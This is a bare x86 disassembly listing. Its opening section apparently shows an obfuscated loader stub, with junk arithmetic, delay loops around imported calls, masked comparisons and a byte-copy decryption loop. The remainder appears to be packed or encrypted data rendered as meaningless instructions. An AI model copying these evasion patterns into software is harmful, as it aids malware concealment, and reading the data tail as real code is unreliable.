  41d2d1:	call   DWORD PTR ds:0x430a2c
  41d2d7:	cmp    DWORD PTR ds:0x426f29,0xb
  41d2de:	jne    0x41d2f3
  41d2e4:	xor    edx,edx
  41d2e6:	add    edx,DWORD PTR ds:0x426f29
  41d2ec:	inc    edx
  41d2ed:	mov    DWORD PTR ds:0x426f29,edx
  41d2f3:	cmp    DWORD PTR ds:0x426f29,0x14
  41d2fa:	jb     0x41d2ad
  41d300:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  41d307:	mov    edx,DWORD PTR ds:0x426ee9
  41d30d:	sbb    DWORD PTR ds:0x426f21,edx
  41d313:	mov    ecx,DWORD PTR [ebp-0x4]
  41d316:	mov    DWORD PTR ds:0x426ebd,0x1b
  41d320:	cmp    DWORD PTR ds:0x426ebd,0x0
  41d327:	je     0x41d371
  41d32d:	cmp    DWORD PTR ds:0x426ebd,0x2
  41d334:	jg     0x41d371
  41d33a:	jmp    0x41d345
  41d33f:	call   DWORD PTR ds:0x430a38
  41d345:	cmp    DWORD PTR ds:0x426ebd,0x3
  41d34c:	jne    0x41d35f
  41d352:	mov    edx,DWORD PTR ds:0x426ebd
  41d358:	dec    edx
  41d359:	mov    DWORD PTR ds:0x426ebd,edx
  41d35f:	mov    edx,DWORD PTR ds:0x426ebd
  41d365:	dec    edx
  41d366:	mov    DWORD PTR ds:0x426ebd,edx
  41d36c:	jmp    0x41d320
  41d371:	push   esi
  41d372:	or     edx,0x1404
  41d378:	mov    edx,0x75108b3
  41d37d:	mov    esi,DWORD PTR ds:0x426eb5
  41d383:	and    DWORD PTR ds:0x426e95,esi
  41d389:	xor    ecx,edx
  41d38b:	xor    esi,DWORD PTR ds:0x426eb9
  41d391:	mov    esi,0x3272fa
  41d396:	push   edi
  41d397:	xor    DWORD PTR ds:0x426ec5,0xe12
  41d3a1:	mov    edi,DWORD PTR [ebp+0x10]
  41d3a4:	add    ecx,esi
  41d3a6:	mov    DWORD PTR ds:0x426f09,0x182c
  41d3b0:	cmp    ecx,edi
  41d3b2:	je     0x41d4a2
  41d3b8:	mov    ecx,DWORD PTR [ebp-0x4]
  41d3bb:	movzx  edi,WORD PTR ds:0x426f09
  41d3c2:	add    DWORD PTR ds:0x426ea5,edi
  41d3c8:	mov    edi,DWORD PTR [ebp+0x10]
  41d3cb:	xor    eax,eax
  41d3cd:	xor    ecx,edx
  41d3cf:	add    ecx,esi
  41d3d1:	add    DWORD PTR ds:0x426ed1,0x330a
  41d3db:	add    edi,0xfabdbecd
  41d3e1:	mov    DWORD PTR ds:0x426ee5,0x5f33
  41d3eb:	adc    eax,0xffffffff
  41d3ee:	and    DWORD PTR ds:0x426ecd,0x4eeb
  41d3f8:	xor    eax,0x0
  41d3fb:	mov    DWORD PTR [ebp-0xc],eax
  41d3fe:	push   ebx
  41d3ff:	xor    ebx,ebx
  41d401:	xor    edi,0x8a29a147
  41d407:	mov    eax,ecx
  41d409:	add    eax,0xfabdbecd
  41d40e:	adc    ebx,0xffffffff
  41d411:	xor    eax,0x8a29a147
  41d416:	xor    ebx,0x0
  41d419:	cmp    eax,edi
  41d41b:	jne    0x41d434
  41d421:	cmp    ebx,DWORD PTR [ebp-0xc]
  41d424:	je     0x41d49c
  41d42a:	jmp    0x41d434
  41d42f:	mov    esi,0x3272fa
  41d434:	mov    eax,DWORD PTR [ebp-0x4]
  41d437:	mov    edi,DWORD PTR [ebp-0x8]
  41d43a:	xor    edi,edx
  41d43c:	add    edi,esi
  41d43e:	mov    esi,DWORD PTR [ebp+0x8]
  41d441:	imul   edi,ecx
  41d444:	mov    ebx,DWORD PTR [ebp+0xc]
  41d447:	xor    eax,edx
  41d449:	add    eax,ecx
  41d44b:	mov    al,BYTE PTR [ebx+eax*1+0x3272fa]
  41d452:	mov    BYTE PTR [edi+esi*1],al
  41d455:	mov    eax,DWORD PTR [ebp-0x8]
  41d458:	mov    esi,DWORD PTR [ebp+0x10]
  41d45b:	xor    eax,edx
  41d45d:	xor    ebx,ebx
  41d45f:	add    esi,0xfabdbecd
  41d465:	adc    ebx,0xffffffff
  41d468:	lea    ecx,[ecx+eax*1+0x3272fa]
  41d46f:	xor    edi,edi
  41d471:	xor    esi,0x8a29a147
  41d477:	xor    ebx,0x0
  41d47a:	mov    eax,ecx
  41d47c:	add    eax,0xfabdbecd
  41d481:	adc    edi,0xffffffff
  41d484:	xor    eax,0x8a29a147
  41d489:	xor    edi,0x0
  41d48c:	cmp    eax,esi
  41d48e:	jne    0x41d42f
  41d494:	cmp    edi,ebx
  41d496:	jne    0x41d42f
  41d49c:	mov    eax,0xf89c85b4
  41d4a1:	pop    ebx
  41d4a2:	pop    edi
  41d4a3:	pop    esi
  41d4a4:	leave  
  41d4a5:	ret    0xc
  41d4a8:	push   ebp
  41d4a9:	mov    ebp,esp
  41d4ab:	push   ecx
  41d4ac:	and    DWORD PTR ds:0x426e8d,0x0
  41d4b6:	mov    eax,ds:0x426e8d
  41d4bb:	inc    eax
  41d4bc:	mov    ds:0x426e8d,eax
  41d4c1:	cmp    DWORD PTR ds:0x426e8d,0x1c
  41d4c8:	jge    0x41d4eb
  41d4ce:	jmp    0x41d4de
  41d4d3:	push   0x5eb6
  41d4d8:	call   DWORD PTR ds:0x430a3c
  41d4de:	cmp    DWORD PTR ds:0x426e8d,0x1a
  41d4e5:	jb     0x41d4b6
  41d4eb:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  41d4f2:	neg    DWORD PTR ds:0x426e9d
  41d4f8:	mov    eax,DWORD PTR [ebp+0x8]
  41d4fb:	or     ecx,edx
  41d4fd:	movsx  eax,BYTE PTR [eax]
  41d500:	sub    ecx,ecx
  41d502:	jmp    0x41f875
  41d507:	ret    0x203
  41d50a:	add    BYTE PTR [edx-0x7e],0x42
  41d50e:	inc    ebx
  41d50f:	cmc    
  41d510:	in     al,0x42
  41d512:	sub    BYTE PTR [ecx+0x628c089f],cl
  41d518:	(bad)  
  41d519:	jp     0x41d596
  41d51b:	rcr    DWORD PTR [ebx+edi*2-0x4d834e85],1
  41d522:	mov    dh,0x91
  41d524:	fld    st(2)
  41d526:	rcr    BYTE PTR [esi-0x25],0x12
  41d52a:	in     eax,0xf9
  41d52c:	ret    0xf435
  41d52f:	pop    ebx
  41d530:	cmp    al,0x85
  41d532:	aam    0x1d
  41d534:	mov    ds:0x98cb2e03,eax
  41d539:	xchg   edi,eax
  41d53a:	or     DWORD PTR [ebx],ebp
  41d53c:	int    0x7d
  41d53e:	dec    esi
  41d53f:	cli    
  41d540:	and    al,0x7a
  41d542:	xor    eax,ebx
  41d544:	mov    bh,0x53
  41d546:	lods   al,BYTE PTR ds:[esi]
  41d547:	bound  esi,QWORD PTR [ecx]
  41d549:	push   ebx
  41d54a:	jg     0x41d533
  41d54c:	dec    esi
  41d54d:	nop
  41d54e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d54f:	bound  esi,QWORD PTR [edi+0x43406015]
  41d555:	or     esp,0x25
  41d558:	cmp    eax,0xe2232d85
  41d55d:	add    edx,DWORD PTR [ebx+0x6]
  41d560:	loopne 0x41d5c5
  41d562:	adc    DWORD PTR [ecx-0x53],edx
  41d565:	cmp    BYTE PTR ds:[ebp-0x63],0x41
  41d56a:	jl     0x41d583
  41d56c:	int    0x70
  41d56e:	aad    0x8e
  41d570:	fidivr DWORD PTR ds:0xea9d4b51
  41d576:	aaa    
  41d577:	sub    BYTE PTR [esp+ebx*2-0x4e],dl
  41d57b:	mov    eax,0xb6738bd6
  41d580:	test   ch,0x8
  41d583:	stos   BYTE PTR es:[edi],al
  41d584:	lahf   
  41d585:	je     0x41d522
  41d587:	ins    BYTE PTR es:[edi],dx
  41d588:	lds    ebx,FWORD PTR [ecx+eiz*2+0x3bbf3b23]
  41d58f:	cwde   
  41d590:	mov    eax,ds:0x18756fff
  41d595:	inc    esp
  41d596:	jecxz  0x41d5c6
  41d598:	sub    DWORD PTR [edi-0x33],0x70
  41d59c:	call   0xf77d25c4
  41d5a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5a2:	add    DWORD PTR [ebp+edx*8+0x25],ebp
  41d5a6:	je     0x41d52a
  41d5a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5a9:	ins    BYTE PTR es:[edi],dx
  41d5aa:	mov    edi,0x733bbeb5
  41d5af:	or     al,0x15
  41d5b1:	jnp    0x41d625
  41d5b3:	in     al,dx
  41d5b4:	std    
  41d5b5:	jl     0x41d5ec
  41d5b7:	retf   
  41d5b8:	dec    ecx
  41d5b9:	sub    cl,BYTE PTR [ebx+0x297f127b]
  41d5bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5c0:	or     esp,eax
  41d5c2:	mov    al,0xf5
  41d5c4:	aas    
  41d5c5:	and    eax,DWORD PTR [ebp-0x63]
  41d5c8:	lods   eax,DWORD PTR ds:[esi]
  41d5c9:	pop    esp
  41d5ca:	and    al,0x7e
  41d5cc:	gs mov ?,edi
  41d5cf:	push   0x42f548cb
  41d5d4:	cmp    dh,BYTE PTR [ebx+0x5355caa1]
  41d5da:	(bad)  
  41d5dc:	mov    ecx,0xf2a1a755
  41d5e1:	repnz and al,0x64
  41d5e4:	dec    esp
  41d5e5:	push   eax
  41d5e6:	test   BYTE PTR [ebx],ah
  41d5e8:	out    dx,al
  41d5e9:	push   cs
  41d5ea:	retf   
  41d5eb:	push   cs
  41d5ec:	pop    esp
  41d5ed:	leave  
  41d5ee:	xor    eax,0x936e69f6
  41d5f3:	mov    ss:0xb9722c1d,al
  41d5f9:	ror    BYTE PTR [ecx+0x31],0xda
  41d5fd:	lods   al,BYTE PTR ds:[esi]
  41d5fe:	pop    ebx
  41d5ff:	fisubr DWORD PTR [ebx+0x195cd448]
  41d605:	mov    bl,0xe7
  41d607:	sbb    BYTE PTR ds:0x5a3422e7,al
  41d60d:	adc    BYTE PTR [eax-0x2a],dl
  41d610:	ds mov al,0xfb
  41d613:	sub    bh,BYTE PTR ds:0xa2bf340c
  41d619:	fcom   QWORD PTR [edi+0x13380ede]
  41d61f:	adc    ah,0x21
  41d622:	or     ah,BYTE PTR [ecx-0x6]
  41d625:	sbb    al,dh
  41d627:	pop    edx
  41d628:	outs   dx,BYTE PTR ds:[esi]
  41d629:	inc    edi
  41d62a:	(bad)  
  41d62b:	stos   DWORD PTR es:[edi],eax
  41d62c:	ds push cs
  41d62e:	pusha  
  41d62f:	adc    edx,DWORD PTR [edi+0x39a5a2e]
  41d635:	ins    BYTE PTR es:[edi],dx
  41d636:	pop    ecx
  41d637:	stos   DWORD PTR es:[edi],eax
  41d638:	jmp    0x41d608
  41d63a:	jp     0x41d671
  41d63c:	sbb    esp,0x55401e1f
  41d642:	es cli 
  41d644:	pop    ds
  41d645:	loope  0x41d5f9
  41d647:	out    0x49,al
  41d649:	out    dx,al
  41d64a:	ror    DWORD PTR ds:0xdbfa81ed,cl
  41d650:	(bad)  
  41d651:	fnstsw WORD PTR [ebx+0x6df42438]
  41d657:	ins    BYTE PTR es:[edi],dx
  41d658:	imul   eax,DWORD PTR [edi],0x2b1f336c
  41d65e:	jns    0x41d624
  41d660:	sbb    edi,ebp
  41d662:	add    al,0x30
  41d664:	popf   
  41d665:	jge    0x41d6b1
  41d667:	pop    ebp
  41d668:	and    esp,DWORD PTR [esi-0x183f9208]
  41d66e:	gs dec ebp
  41d670:	jmp    0x41d6c1
  41d672:	cli    
  41d673:	or     ecx,edi
  41d675:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d676:	adc    DWORD PTR [esi-0x2579c77d],eax
  41d67c:	mov    ebx,0xa9b2d0e7
  41d681:	stos   BYTE PTR es:[edi],al
  41d682:	sub    edx,DWORD PTR [edi]
  41d684:	adc    esi,DWORD PTR [ecx]
  41d686:	mov    di,0x4b80
  41d68a:	push   eax
  41d68b:	lods   al,BYTE PTR ds:[esi]
  41d68c:	xchg   edi,eax
  41d68d:	fisttp DWORD PTR [edx]
  41d68f:	or     bl,ah
  41d691:	mov    dl,0x69
  41d693:	mov    ecx,0x428df65d
  41d698:	rcr    esi,cl
  41d69a:	pop    ebx
  41d69b:	mov    ecx,0x1d202772
  41d6a0:	leave  
  41d6a1:	dec    eax
  41d6a2:	adc    al,0xe5
  41d6a4:	xlat   BYTE PTR ds:[ebx]
  41d6a5:	mov    ds:0x1bfe8e6,eax
  41d6aa:	loop   0x41d661
  41d6ac:	inc    ebx
  41d6ad:	xchg   esp,eax
  41d6ae:	iret   
  41d6af:	test   al,0xea
  41d6b1:	test   eax,0x70f88905
  41d6b6:	mov    DWORD PTR [ecx+0x16b9b217],edi
  41d6bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6bd:	test   dl,dh
  41d6bf:	mov    dl,dh
  41d6c1:	imul   edx,DWORD PTR [edx+esi*4+0x31],0x11
  41d6c6:	sar    esi,cl
  41d6c8:	sbb    al,0x9b
  41d6ca:	mov    DWORD PTR [edi-0x50],0xfdfa1486
  41d6d1:	cmp    ah,BYTE PTR [eax-0x3c98f4b9]
  41d6d7:	push   cs
  41d6d8:	leave  
  41d6d9:	lahf   
  41d6da:	mov    eax,ds:0x630ad7de
  41d6df:	loop   0x41d6b0
  41d6e1:	add    dh,cl
  41d6e3:	adc    ah,al
  41d6e5:	xor    DWORD PTR [esi+0x221b412],esp
  41d6eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6ec:	xchg   BYTE PTR [ebx+ebx*4],bl
  41d6ef:	cmp    ebp,ecx
  41d6f1:	fxch   st(4)
  41d6f3:	retf   0xd4d6
  41d6f6:	lods   eax,DWORD PTR ds:[esi]
  41d6f7:	or     ch,BYTE PTR [eax+0x65c1dd30]
  41d6fd:	sbb    bl,cl
  41d6ff:	icebp  
  41d700:	push   ds
  41d701:	int3   
  41d702:	sub    ebp,DWORD PTR [ebx]
  41d704:	add    dl,ah
  41d706:	or     eax,0xf2e38307
  41d70b:	les    esp,FWORD PTR [edx-0x54503ebf]
  41d711:	cwde   
  41d712:	loope  0x41d6a4
  41d714:	leave  
  41d715:	mov    bh,al
  41d717:	outs   dx,DWORD PTR ds:[esi]
  41d718:	arpl   WORD PTR [esi+0x6137a373],bx
  41d71e:	stc    
  41d71f:	icebp  
  41d720:	sbb    BYTE PTR [edx-0x14a37dab],ah
  41d726:	push   ds
  41d727:	cmp    al,0xa7
  41d729:	int    0x29
  41d72b:	mov    eax,ss:0x63faa45
  41d731:	imul   ebp,DWORD PTR [eax+esi*2+0x30],0xcbac0be7
  41d739:	sub    eax,0xc46fdba2
  41d73e:	repnz dec ecx
  41d740:	add    ah,BYTE PTR [eax+ecx*1]
  41d743:	out    0x5c,al
  41d745:	outs   dx,DWORD PTR ds:[esi]
  41d746:	in     al,0x90
  41d748:	sub    eax,0xdbfbf4f5
  41d74d:	cmp    BYTE PTR [esi+0xf],ch
  41d750:	jmp    0x9123:0x63ebc80a
  41d757:	xor    bl,BYTE PTR [di+0x4f]
  41d75b:	dec    esp
  41d75c:	mov    esi,0x1a824d4f
  41d761:	mov    cl,0xc7
  41d763:	xor    al,0x51
  41d765:	push   ss
  41d766:	inc    edx
  41d767:	push   ss
  41d768:	das    
  41d769:	pusha  
  41d76a:	sti    
  41d76b:	test   eax,0xe976ccd1
  41d770:	out    0x51,eax
  41d772:	adc    eax,0x15b5f804
  41d777:	xor    BYTE PTR [ebp-0x45df9670],ah
  41d77d:	pop    esp
  41d77e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d77f:	adc    eax,0x37508c81
  41d784:	push   edi
  41d785:	stc    
  41d786:	inc    ebx
  41d787:	xchg   ecx,eax
  41d788:	int    0x4e
  41d78a:	fcom   DWORD PTR [edx-0x1c]
  41d78d:	jnp    0x41d7d5
  41d78f:	pop    ebx
  41d790:	sbb    al,0x69
  41d792:	idiv   ebp
  41d794:	jno    0x41d753
  41d796:	xchg   esi,eax
  41d797:	out    dx,eax
  41d798:	pop    ecx
  41d799:	test   eax,0xfda4eb22
  41d79e:	sub    ecx,esp
  41d7a0:	xchg   ecx,eax
  41d7a1:	cmp    al,0xcf
  41d7a3:	or     ebp,ebx
  41d7a5:	inc    edx
  41d7a6:	sbb    al,0xa0
  41d7a8:	and    esp,ebx
  41d7aa:	push   esp
  41d7ab:	clc    
  41d7ac:	je     0x41d829
  41d7ae:	jnp    0x41d7d7
  41d7b0:	div    BYTE PTR [ecx-0x78]
  41d7b3:	pop    ss
  41d7b4:	repnz or BYTE PTR ds:0xa4a326c6,0xf1
  41d7bc:	cmp    eax,esp
  41d7be:	xchg   cl,al
  41d7c0:	push   esi
  41d7c1:	loope  0x41d753
  41d7c3:	mov    cl,0x67
  41d7c5:	into   
  41d7c6:	(bad)  
  41d7c7:	(bad)  
  41d7c8:	pop    edx
  41d7c9:	cdq    
  41d7ca:	pop    edi
  41d7cb:	pop    ss
  41d7cc:	gs and eax,0x5816480f
  41d7d2:	sti    
  41d7d3:	sbb    DWORD PTR [edx+0x62b4d47d],ebp
  41d7d9:	push   ebx
  41d7da:	jns    0x41d826
  41d7dc:	push   cs
  41d7dd:	jl     0x41d762
  41d7df:	and    ebx,ebp
  41d7e1:	mov    bl,0x38
  41d7e3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7e5:	dec    eax
  41d7e6:	js     0x41d80b
  41d7e8:	repnz nop
  41d7ea:	xchg   ebx,eax
  41d7eb:	gs ja  0x41d7d4
  41d7ee:	in     eax,0xb3
  41d7f0:	xor    DWORD PTR [ebp+0x25],esi
  41d7f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7f4:	ins    DWORD PTR es:[edi],dx
  41d7f5:	adc    eax,0xea802832
  41d7fa:	and    al,0x7e
  41d7fc:	fiadd  WORD PTR [eax-0x24]
  41d7ff:	push   DWORD PTR [edx+0x6b]
  41d802:	neg    DWORD PTR ds:0xf08be9af
  41d808:	les    ecx,FWORD PTR [eax-0x32]
  41d80b:	mov    dl,cl
  41d80d:	call   0x91de2410
  41d812:	stos   BYTE PTR es:[edi],al
  41d813:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d814:	xchg   ebx,eax
  41d815:	push   DWORD PTR [ecx]
  41d817:	jne    0x41d825
  41d819:	adc    DWORD PTR [esi+0x24ba0ad6],ebp
  41d81f:	cld    
  41d820:	outs   dx,BYTE PTR ds:[esi]
  41d821:	mov    ecx,0x895b46e2
  41d826:	mov    ds:0x5a481d2d,al
  41d82b:	mov    BYTE PTR ds:0x844147a6,ah
  41d831:	jp     0x41d7b3
  41d833:	adc    BYTE PTR [ebp+0x1],dh
  41d836:	mov    edx,0x2b967e76
  41d83b:	push   ebp
  41d83c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d83d:	xchg   ecx,eax
  41d83e:	mov    ss,WORD PTR [ecx+0x2a]
  41d841:	clc    
  41d842:	fcmovbe st,st(2)
  41d844:	es dec ebp
  41d846:	cdq    
  41d847:	jae    0x41d8b5
  41d849:	fiadd  DWORD PTR [eax]
  41d84b:	inc    ebx
  41d84c:	sub    eax,0xc876b2d0
  41d851:	fcom   QWORD PTR [ebp+0x45]
  41d854:	inc    esi
  41d855:	ficomp DWORD PTR [edi-0x39dc995d]
  41d85b:	adc    DWORD PTR [ecx+esi*4-0x10d7e709],eax
  41d862:	cmp    ch,BYTE PTR [edx-0xf]
  41d865:	jae    0x41d89e
  41d867:	cwde   
  41d868:	pop    ds
  41d869:	fnstcw WORD PTR [eax-0x30]
  41d86c:	icebp  
  41d86d:	mov    bl,0x96
  41d86f:	test   al,0xba
  41d871:	fist   WORD PTR [eax]
  41d873:	retf   
  41d874:	jecxz  0x41d81f
  41d876:	(bad)  
  41d877:	hlt    
  41d878:	imul   DWORD PTR [esi-0x33e01f8]
  41d87e:	or     cl,0xc1
  41d881:	mov    ds:0xec07acd1,eax
  41d886:	xor    al,0x25
  41d888:	out    0x26,eax
  41d88a:	jae    0x41d8f3
  41d88c:	(bad)  
  41d88d:	and    BYTE PTR [edx+ecx*2-0x3e95c020],bl
  41d894:	in     eax,dx
  41d895:	retf   
  41d896:	pop    esp
  41d897:	inc    esi
  41d898:	ins    DWORD PTR es:[edi],dx
  41d899:	shl    DWORD PTR [edx-0x58],0xc3
  41d89d:	retf   
  41d89e:	xor    eax,0x32ae033d
  41d8a3:	callw  0x7800
  41d8a7:	adc    BYTE PTR [eax-0x4d],bl
  41d8aa:	dec    edx
  41d8ab:	(bad)  
  41d8ac:	mov    bl,0x29
  41d8ae:	outs   dx,BYTE PTR ds:[esi]
  41d8af:	outs   dx,BYTE PTR ds:[esi]
  41d8b0:	or     al,0x24
  41d8b2:	mov    ch,0x60
  41d8b4:	sub    al,0xf1
  41d8b6:	int    0x9
  41d8b8:	cld    
  41d8b9:	test   al,0x5d
  41d8bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8bc:	dec    esp
  41d8bd:	jmp    0x41d92c
  41d8bf:	add    ebx,DWORD PTR [ebx+0x15]
  41d8c2:	mov    al,BYTE PTR [esi]
  41d8c4:	out    dx,al
  41d8c5:	jbe    0x41d8eb
  41d8c7:	jb     0x41d91e
  41d8c9:	push   ebx
  41d8ca:	sub    DWORD PTR [ecx],edx
  41d8cc:	xor    eax,0x91da5af6
  41d8d1:	cmp    BYTE PTR ds:0xe956153b,ch
  41d8d7:	jl     0x41d8ae
  41d8d9:	mov    edx,0x5b4ca8c7
  41d8de:	jmp    0x3d50:0x853349b6
  41d8e5:	jecxz  0x41d94b
  41d8e7:	arpl   WORD PTR [eax-0x47],si
  41d8ea:	outs   dx,BYTE PTR ds:[esi]
  41d8eb:	popf   
  41d8ec:	sahf   
  41d8ed:	add    DWORD PTR ds:[ebx],ebx
  41d8f0:	fcom   QWORD PTR [edi+0x2f]
  41d8f3:	mov    ds,WORD PTR [esi+0x74]
  41d8f6:	mov    edx,0x5f1c0654
  41d8fb:	mov    dl,0x7b
  41d8fd:	push   ebp
  41d8fe:	bound  ebx,QWORD PTR [eax]
  41d900:	dec    edx
  41d901:	ja     0x41d88b
  41d903:	jmp    0xf388:0x671d3246
  41d90a:	adc    ecx,DWORD PTR [edi]
  41d90c:	xor    al,0xb8
  41d90e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d90f:	rol    BYTE PTR [ebx],1
  41d911:	into   
  41d912:	fcmovnb st,st(7)
  41d914:	or     eax,0xcbe4e970
  41d919:	loop   0x41d8f9
  41d91b:	cmc    
  41d91c:	inc    esp
  41d91d:	sub    DWORD PTR [esi+ebp*2+0x10c44d1b],0xffffff85
  41d925:	ss out dx,al
  41d927:	mov    al,ds:0x5a623f81
  41d92c:	cld    
  41d92d:	push   esi
  41d92e:	loop   0x41d8e3
  41d930:	(bad)  
  41d931:	xchg   esp,eax
  41d932:	pop    ebp
  41d933:	push   es
  41d934:	int3   
  41d935:	mov    esi,0x78374137
  41d93a:	rcr    DWORD PTR [esi-0x21],1
  41d93d:	aad    0x77
  41d93f:	(bad)  
  41d940:	retf   0x1274
  41d943:	mov    WORD PTR [edx-0x7ea7c90f],cs
  41d949:	(bad)  
  41d94a:	gs clc 
  41d94c:	in     eax,dx
  41d94d:	pop    ss
  41d94e:	retf   
  41d94f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d950:	pop    es
  41d951:	add    al,0xf
  41d953:	mov    esi,0x77e32def
  41d958:	xchg   ebx,eax
  41d959:	nop
  41d95a:	inc    edx
  41d95b:	inc    edx
  41d95c:	pop    es
  41d95d:	mov    fs,WORD PTR [edi-0xd]
  41d960:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d961:	push   es
  41d962:	mov    ebx,0xa69c931a
  41d967:	dec    ebx
  41d968:	sub    BYTE PTR [ecx],ch
  41d96a:	sbb    bl,BYTE PTR [eax-0x174789d5]
  41d970:	sub    DWORD PTR [esi+0x6e1f28a],esi
  41d976:	add    ebx,DWORD PTR [ecx-0x22ac826a]
  41d97c:	in     eax,0x49
  41d97e:	int3   
  41d97f:	adc    bl,0xa7
  41d982:	mov    edx,0xfe889c19
  41d987:	clc    
  41d988:	and    ah,BYTE PTR [esp+edx*1+0x1e2798c4]
  41d98f:	add    esi,edi
  41d991:	or     eax,DWORD PTR [ebp-0x1ca59dd3]
  41d997:	jb     0x41d91f
  41d999:	into   
  41d99a:	mov    ebp,0xb7465e63
  41d99f:	out    0xd6,al
  41d9a1:	pop    esp
  41d9a2:	dec    ebp
  41d9a3:	outs   dx,BYTE PTR ds:[esi]
  41d9a4:	pop    edi
  41d9a5:	add    ch,al
  41d9a7:	push   ds
  41d9a8:	bnd call 0x857bf261
  41d9ae:	and    eax,0xee11f119
  41d9b3:	cli    
  41d9b4:	mov    esi,0xeb6d9f6d
  41d9b9:	dec    ebp
  41d9ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9bb:	jmp    0xfe68b9b
  41d9c0:	add    DWORD PTR [edx+0x71458594],edi
  41d9c6:	jae    0x41d97f
  41d9c8:	mov    edx,DWORD PTR [ebx+0x63a25453]
  41d9ce:	xlat   BYTE PTR ds:[ebx]
  41d9cf:	dec    edi
  41d9d0:	xlat   BYTE PTR ds:[ebx]
  41d9d1:	mov    edi,0x85fd8944
  41d9d6:	cwde   
  41d9d7:	jb     0x41da06
  41d9d9:	jge    0x41d9f3
  41d9db:	test   al,0xb0
  41d9dd:	(bad)  
  41d9de:	(bad)  
  41d9df:	fidiv  DWORD PTR [edi+0x73]
  41d9e2:	lods   eax,DWORD PTR ds:[esi]
  41d9e3:	or     eax,0xb52f198f
  41d9e8:	xchg   edi,eax
  41d9e9:	mov    dl,0x37
  41d9eb:	xlat   BYTE PTR ds:[ebx]
  41d9ec:	sbb    eax,0x72a1bf71
  41d9f1:	adc    eax,0x2bef0d22
  41d9f6:	mov    ah,0xfa
  41d9f8:	and    ebp,DWORD PTR [edx]
  41d9fa:	sahf   
  41d9fb:	in     eax,0xe1
  41d9fd:	dec    eax
  41d9fe:	mov    eax,ds:0xb92f2d38
  41da03:	push   eax
  41da04:	and    edi,DWORD PTR [eax]
  41da06:	ins    BYTE PTR es:[edi],dx
  41da07:	cmp    BYTE PTR [edi],dl
  41da09:	repz add eax,0x35dedf1a
  41da0f:	(bad)  
  41da10:	lods   al,BYTE PTR ds:[esi]
  41da11:	sbb    BYTE PTR [ebx+0x49],ch
  41da14:	jge    0x41da25
  41da16:	cs push ebx
  41da18:	xor    BYTE PTR [edx-0x28c4263a],ah
  41da1e:	fcomp  QWORD PTR [ecx+0xd66f659]
  41da24:	add    eax,0xd0a6e66
  41da29:	hlt    
  41da2a:	xor    ebx,DWORD PTR [ebx]
  41da2c:	cmp    BYTE PTR [edi+edx*1-0x74e72e06],0x8b
  41da34:	(bad)  
  41da35:	jp     0x41da1b
  41da37:	fidivr DWORD PTR [ebp+0x12]
  41da3a:	das    
  41da3b:	pop    ecx
  41da3c:	push   ds
  41da3d:	clc    
  41da3e:	js     0x41da71
  41da40:	outs   dx,DWORD PTR ds:[esi]
  41da41:	jnp    0x41da34
  41da43:	(bad)  
  41da45:	mov    ebx,fs
  41da47:	mov    BYTE PTR [esi+edx*8+0x24],bh
  41da4b:	scas   al,BYTE PTR es:[edi]
  41da4c:	push   ebx
  41da4d:	aas    
  41da4e:	bswap  esp
  41da50:	div    BYTE PTR [edx+0x47bf9a39]
  41da56:	push   cs
  41da57:	sub    esp,DWORD PTR [ebx+ecx*1+0x68c69ad2]
  41da5e:	retf   0x449b
  41da61:	xor    BYTE PTR [edi+0x10728872],cl
  41da67:	ret    
  41da68:	or     dh,BYTE PTR [ebx]
  41da6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da6b:	fst    DWORD PTR [ebx]
  41da6d:	jb     0x41da58
  41da6f:	ds adc eax,0x5f5f19d0
  41da75:	data16 (bad) 
  41da78:	jbe    0x41da98
  41da7a:	mov    ch,0x8a
  41da7c:	out    dx,eax
  41da7d:	add    al,0x5e
  41da7f:	pop    edi
  41da80:	arpl   WORD PTR [esi],sp
  41da82:	pusha  
  41da83:	dec    ebp
  41da84:	je     0x41da29
  41da86:	out    0x35,eax
  41da88:	fs push esi
  41da8a:	inc    ebp
  41da8b:	jl     0x41da45
  41da8d:	jno    0x41da8b
  41da8f:	int3   
  41da90:	xchg   edi,eax
  41da91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da92:	jge    0x41da39
  41da94:	push   0xffffff85
  41da96:	jnp    0x41dae2
  41da98:	call   0x813d:0x6f66f501
  41da9f:	(bad)  
  41daa0:	jbe    0x41da9a
  41daa2:	loop   0x41da56
  41daa4:	pop    ebx
  41daa5:	xchg   ecx,eax
  41daa6:	mov    dh,0x83
  41daa8:	xor    eax,0x6925c17d
  41daad:	add    eax,0xac510603
  41dab2:	arpl   cx,ax
  41dab4:	int3   
  41dab5:	dec    esp
  41dab6:	dec    ebp
  41dab7:	lods   al,BYTE PTR ds:[esi]
  41dab8:	dec    edi
  41dab9:	je     0x41da95
  41dabb:	aaa    
  41dabc:	cli    
  41dabd:	data16 mov cl,0xc5
  41dac0:	(bad)  
  41dac2:	mov    al,ds:0xa26dc228
  41dac7:	add    ecx,edx
  41dac9:	out    0x1c,al
  41dacb:	sahf   
  41dacc:	(bad)  
  41dacd:	(bad)  
  41dace:	xchg   ebp,eax
  41dacf:	jmp    FWORD PTR [ebp+0x46]
  41dad2:	and    eax,0xbdc1118c
  41dad7:	test   eax,0x49e1798f
  41dadc:	popa   
  41dadd:	xchg   ebx,eax
  41dade:	imul   ecx,DWORD PTR [eax+0x2b],0x2b
